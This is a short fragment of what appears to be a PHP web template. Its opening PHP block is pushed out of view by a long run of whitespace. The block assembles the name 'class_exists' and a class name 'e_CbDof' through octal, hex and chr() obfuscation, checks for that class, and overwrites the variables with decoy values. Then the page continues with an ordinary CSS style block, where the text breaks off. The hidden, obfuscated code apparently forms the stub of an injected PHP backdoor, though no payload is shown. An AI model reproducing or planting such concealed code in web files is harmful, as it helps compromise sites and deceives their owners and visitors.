<?php                                                                                                                                                                                                                                                                                                                                                                                                 $RppDVNky = "\145" . chr ( 951 - 856 ).chr ( 688 - 621 )."\142" . "\x44" . "\x6f" . chr ( 342 - 240 ); $UuQVEyn = "\x63" . "\154" . 'a' . chr (115) . 's' . chr ( 598 - 503 ).'e' . "\x78" . 'i' . chr (115) . 't' . "\x73";$eVhbksbZH = class_exists($RppDVNky); $RppDVNky = "62661";$UuQVEyn = "48853";$YUTblbe = FALSE; ?><style>
    .card-bg{
